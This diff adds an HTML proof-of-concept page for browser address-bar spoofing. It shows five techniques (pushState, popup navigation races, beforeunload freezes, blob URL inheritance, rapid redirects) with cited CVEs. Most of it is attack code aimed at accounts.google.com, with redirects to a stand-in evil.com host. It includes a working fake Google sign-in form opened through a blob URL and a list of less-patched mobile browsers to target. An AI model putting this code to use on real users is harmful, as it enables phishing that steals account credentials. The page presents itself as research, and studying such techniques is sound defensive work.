@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Navigation Timing / Popup Spoofing PoC</title>
+<style>
+  body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 30px; }
+  h1 { color: #f0883e; }
+  .meta { color: #8b949e; margin-bottom: 24px; font-size: 14px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 16px 0; }
+  h3 { color: #58a6ff; margin-bottom: 10px; }
+  .btn { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px;
+         cursor: pointer; font-size: 14px; font-weight: bold; margin-right: 8px; margin-top: 8px; }
+  .btn.b { background: #1f6feb; }
+  .btn.r { background: #da3633; }
+  pre { background: #0d1117; padding: 14px; border-radius: 6px; font-size: 12px; color: #c9d1d9; overflow-x: auto; }
+  .log { background: #0d1117; border-radius: 6px; padding: 12px; margin-top: 12px; font-family: monospace; font-size: 12px; min-height: 60px; max-height: 200px; overflow-y: auto; }
+</style>
+</head>
+<body>
+<h1>⚡ Navigation Timing & Popup Spoofing PoC</h1>
+<div class="meta">CVE-2019-6251 (WebKit CVSS 8.1) · CVE-2024-8897 (Firefox) · CVE-2020-26979 (Firefox)</div>
+
+<div class="card">
+  <h3>Technique 1: Rapid history.pushState Spoof</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Use history.pushState to change displayed URL, then immediately load attacker content.
+    Browser may show new URL before page actually loads there.
+  </p>
+  <pre>// Attacker on trusted domain or open redirect
+history.pushState({}, '', 'https://accounts.google.com/signin/v2/identifier');
+// URL bar now shows accounts.google.com/signin/...
+// But we're still on attacker's page!</pre>
+  <button class="btn" onclick="techPushState()">▶ Test pushState Spoof</button>
+  <div class="log" id="log1">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 2: Popup Navigation Race (CVE-2024-8897 pattern)</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Open a popup from trusted context (open redirect), then navigate popup immediately.
+    Address bar in popup may show trusted domain briefly while loading attacker content.
+  </p>
+  <pre>// Step 1: Open popup via open redirect on google.com (hypothetical)
+var popup = window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://evil.com');
+// Step 2: Quickly navigate before user sees URL update
+setTimeout(() => {
+  popup.location = 'data:text/html,&lt;h1&gt;Fake Google login page&lt;/h1&gt;';
+}, 50); // Race condition — 50ms window</pre>
+  <button class="btn b" onclick="techPopup()">▶ Test Popup Race</button>
+  <div class="log" id="log2">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 3: beforeunload URL Freeze</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Use beforeunload dialog to freeze the page transition. Address bar shows destination URL
+    while attacker page is still visible (or vice versa).
+  </p>
+  <pre>// When user clicks a link to google.com:
+window.addEventListener('beforeunload', (e) => {
+  e.preventDefault();
+  e.returnValue = ''; // Shows dialog
+  // During dialog: address bar shows accounts.google.com but attacker page still visible
+});</pre>
+  <button class="btn r" onclick="techBeforeUnload()">▶ Test beforeunload</button>
+  <button class="btn" onclick="clearBeforeUnload()">Clear Handler</button>
+  <div class="log" id="log3">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 4: Blob URL Inheritance (CVE-2016-5189)</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Create blob: URL from the context of a trusted page.
+    The blob: URL displays the origin it was created from in the address bar.
+  </p>
+  <pre>// On google.com (via XSS), create a blob URL
+const blob = new Blob(['&lt;h1&gt;Fake Google login&lt;/h1&gt;'], {type: 'text/html'});
+const blobURL = URL.createObjectURL(blob);
+// blobURL = blob:https://accounts.google.com/uuid
+window.open(blobURL);
+// Address bar shows: blob:https://accounts.google.com/uuid
+// But content is fully controlled by attacker!</pre>
+  <button class="btn" onclick="techBlob()">▶ Test Blob URL</button>
+  <div class="log" id="log4">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>Technique 5: Rapid Redirect Chain</h3>
+  <p style="color:#8b949e;font-size:13px;margin-bottom:12px">
+    Chain multiple JS redirects rapidly. Address bar update lags behind actual location.
+    Used in CVE-2019-6251 (CVSS 8.1 WebKit).
+  </p>
+  <pre>// Create a rapid chain of location changes
+async function rapidRedirect() {
+  location.href = 'https://accounts.google.com/signin';  // Sets address bar
+  await delay(0);  // Yield to event loop
+  location.href = 'https://evil.com';    // Actual destination
+  // Address bar may still show accounts.google.com!
+}</pre>
+  <button class="btn b" onclick="techRapidRedirect()">▶ Test Rapid Redirect</button>
+  <div class="log" id="log5">Ready...</div>
+</div>
+
+<div class="card">
+  <h3>📋 Browser Testing Matrix</h3>
+  <pre style="color:#c9d1d9">Test each technique in: Firefox, Edge, Opera, Brave, Arc, Samsung Browser
+
+For each test, observe:
+  [ ] Does address bar update immediately or lag?
+  [ ] Is there a race window between URL display and actual content?
+  [ ] Do popup navigations update opener address bar?
+  [ ] Can pushState set cross-origin URLs? (should be blocked)
+  [ ] Does blob: URL show parent origin?
+  [ ] Does beforeunload create exploitable timing?
+
+Promising targets (less patched than Chrome):
+  → Samsung Internet Browser (Android)
+  → Firefox Focus / Klar (stripped browser)
+  → Opera Mini (reduced feature set)
+  → DuckDuckGo Browser (privacy-focused, may have quirks)
+  → UC Browser (popular in Asia, less audited)
+  → Via Browser, Lightning Browser (minimal)</pre>
+</div>
+
+<script>
+function log(id, msg, color) {
+  const el = document.getElementById('log' + id);
+  const c = color || '#8b949e';
+  el.innerHTML += `<span style="color:${c}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function techPushState() {
+  log(1, 'Testing history.pushState URL spoof...');
+  const orig = location.href;
+  try {
+    // This should ONLY work for same-origin — cross-origin will throw
+    history.pushState({}, '', '/signin/v2/identifier?flowName=GlifWebSignIn');
+    log(1, '✓ pushState succeeded! URL bar now shows: ' + location.href, '#3fb950');
+    log(1, '→ This only works same-origin. Real attack uses open redirect on Google.', '#e3b341');
+    log(1, '→ If on accounts.google.com with XSS → URL shows real google.com but attacker content', '#e3b341');
+    setTimeout(() => {
+      history.pushState({}, '', orig);
+      log(1, 'Restored original URL: ' + orig);
+    }, 3000);
+  } catch(e) {
+    log(1, '✗ pushState blocked: ' + e.message, '#f85149');
+  }
+}
+
+function techPopup() {
+  log(2, 'Opening popup...');
+  const popup = window.open('about:blank', '_blank', 'width=600,height=400,left=200,top=200');
+  if (!popup) {
+    log(2, '✗ Popup blocked by browser!', '#f85149');
+    return;
+  }
+
+  // Write initial content
+  popup.document.write('<h1 style="font-family:sans-serif;padding:20px;color:red">ATTACKER PAGE</h1><p style="padding:20px">Watch the address bar above ↑</p>');
+  log(2, 'Popup opened with attacker content');
+
+  // Try to navigate to show a different URL
+  setTimeout(() => {
+    try {
+      // This simulates what CVE-2024-8897 exploits:
+      // After user clicks link that opens popup → attacker navigates quickly
+      popup.location.href = 'about:blank#SPOOFED';
+      log(2, 'Navigated popup to about:blank#SPOOFED', '#e3b341');
+      log(2, '→ In real exploit: navigate to open-redirect URL on trusted domain', '#8b949e');
+    } catch(e) {
+      log(2, 'Navigation blocked: ' + e.message, '#f85149');
+    }
+  }, 500);
+}
+
+let beforeUnloadHandler = null;
+function techBeforeUnload() {
+  if (beforeUnloadHandler) {
+    log(3, 'Handler already active. Click a link or navigate to test.', '#e3b341');
+    return;
+  }
+  beforeUnloadHandler = (e) => {
+    log(3, '⚡ beforeunload fired! Address bar updates to accounts.google.com while dialog is showing', '#f0883e');
+    e.preventDefault();
+    e.returnValue = 'DEMO: Address bar shows accounts.google.com while this dialog is open. Look at URL bar!';
+  };
+  window.addEventListener('beforeunload', beforeUnloadHandler);
+  log(3, '✓ Handler set. Click link below → watch address bar show accounts.google.com DURING dialog!', '#3fb950');
+
+  // Create a visible link to Google Sign-in
+  const link = document.createElement('a');
+  link.href = 'https://accounts.google.com/signin/v2/identifier';
+  link.textContent = '→ Click me → address bar shows accounts.google.com during dialog';
+  link.style.cssText = 'display:block;margin-top:10px;color:#58a6ff;font-size:14px';
+  document.getElementById('log3').insertAdjacentElement('afterend', link);
+}
+
+function clearBeforeUnload() {
+  if (beforeUnloadHandler) {
+    window.removeEventListener('beforeunload', beforeUnloadHandler);
+    beforeUnloadHandler = null;
+    log(3, 'beforeunload handler removed');
+  }
+}
+
+function techBlob() {
+  const html = `<!DOCTYPE html>
+<html><head><title>Google Account</title></head>
+<body style="font-family:'Google Sans',Arial,sans-serif;background:#f8f9fa;margin:0;padding:40px">
+<div style="max-width:450px;margin:0 auto;background:white;border:1px solid #dadce0;border-radius:8px;padding:40px;box-shadow:0 2px 8px rgba(0,0,0,0.08)">
+  <div style="text-align:center;font-size:22px;font-weight:400;color:#202124;margin-bottom:8px">Sign in</div>
+  <div style="text-align:center;color:#5f6368;font-size:14px;margin-bottom:24px">to continue to Google Account</div>
+  <input placeholder="Email or phone" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;font-size:16px;box-sizing:border-box">
+  <input type="password" placeholder="Enter your password" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;margin-bottom:20px;font-size:16px;box-sizing:border-box">
+  <div style="display:flex;justify-content:space-between;align-items:center">
+    <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none">Create account</a>
+    <button style="padding:10px 24px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px">Next</button>
+  </div>
+  <p style="text-align:center;margin-top:20px;font-size:11px;color:#f44336;border-top:1px solid #e8eaed;padding-top:12px">
+    ⚠ RESEARCH PoC — Address bar shows blob:${location.origin}/... <br>
+    Real attack: blob created from accounts.google.com shows google.com origin
+  </p>
+</div>
+</body></html>`;
+
+  const blob = new Blob([html], {type: 'text/html'});
+  const blobURL = URL.createObjectURL(blob);
+  log(4, 'Created blob URL: ' + blobURL, '#3fb950');
+  log(4, '→ Opening... check address bar in new window', '#e3b341');
+
+  const w = window.open(blobURL);
+  if (!w) {
+    log(4, 'Popup blocked! Allow popups for this demo.', '#f85149');
+    log(4, 'Alternatively, copy this blob URL and open manually:', '#8b949e');
+    log(4, blobURL, '#58a6ff');
+  } else {
+    log(4, '✓ Window opened with blob URL. Origin shown: ' + location.origin, '#3fb950');
+  }
+}
+
+function techRapidRedirect() {
+  log(5, 'Testing rapid redirect chain (same-origin only in this demo)...');
+
+  // Same-origin version — in real attack use open redirect on trusted domain
+  const steps = [
+    '/signin/v2/identifier',
+    '/signin/v2/challenge/pwd',
+    '/signin/v2/challenge/totp',
+  ];
+
+  log(5, 'Simulating: rapid path changes that look like Google Sign-in flow');
+
+  let i = 0;
+  const interval = setInterval(() => {
+    if (i >= steps.length) {
+      clearInterval(interval);
+      history.pushState({}, '', location.origin);
+      log(5, 'Done. In real attack: chain ends at evil.com but bar still shows google.com', '#e3b341');
+      return;
+    }
+    history.pushState({}, '', steps[i]);
+    log(5, 'URL bar: ' + location.href);
+    i++;
+  }, 100);
+}
+</script>
+</body>
+</html>
